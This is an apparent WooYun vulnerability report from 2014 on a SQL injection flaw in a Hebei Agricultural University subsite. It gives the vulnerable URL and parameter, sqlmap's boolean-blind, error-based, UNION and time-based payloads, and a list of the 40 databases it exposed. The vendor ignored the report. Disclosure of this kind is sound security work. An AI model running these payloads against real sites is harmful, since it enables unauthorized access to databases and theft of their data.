wybug_title: 河北农业大学分站存在sql注射漏洞
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail: 漏洞详情 披露状态：   									2014-06-05：	细节已通知厂商并且等待厂商处理中									2014-06-10：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 存在sql注入，涉及多个网站上百个表 详细说明：  存在注入的url：http://jiwei.hebau.edu.cn/list.php?cid=5Place: GETParameter: cid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: cid=5) AND 1242=1242 AND (8413=8413    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: cid=5) AND (SELECT 2229 FROM(SELECT COUNT(*),CONCAT(0x716a727671,(SELECT (CASE WHEN (2229=2229) THEN 1 ELSE 0 END)),0x7162796671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (3664=3664    Type: UNION query    Title: MySQL UNION query (NULL) - 5 columns    Payload: cid=5) UNION ALL SELECT CONCAT(0x716a727671,0x6c4d5055645246627263,0x7162796671),NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: cid=5) AND SLEEP(5) AND (9146=9146---[08:50:00] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.2.17back-end DBMS: MySQL 5.0   漏洞证明：  available databases [40]:[*] aiph[*] Art[*] chawenhua[*] chengjiao[*] dangban[*] dedecmsv57gbksp1[*] dongke[*] eltx[*] enjujube[*] forestry[*] ggx[*] GZC[*] houqin[*] information_schema[*] jjw_news[*] kjxn[*] laoganbu[*] mingpushop[*] mysql[*] newtea[*] phpcms[*] Plants_Field_Guide[*] sfkm[*] sizheng[*] teanew[*] test[*] tongXingWang[*] ucenter[*] wdcpdb[*] xiaochanban[*] xiaoqing[*] xiaoyou[*] xinxi[*] xszz[*] xxeasy_sixiu[*] xxeasybbs[*] yuanyiwt[*] yzcdc[*] zhibao[*] ziziphus40个库，有上百个表，包括多个论坛网站   修复方案：  过滤   版权声明：转载请注明来源 mozzie@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-06-10 13:48 厂商回复：  最新状态： 暂无
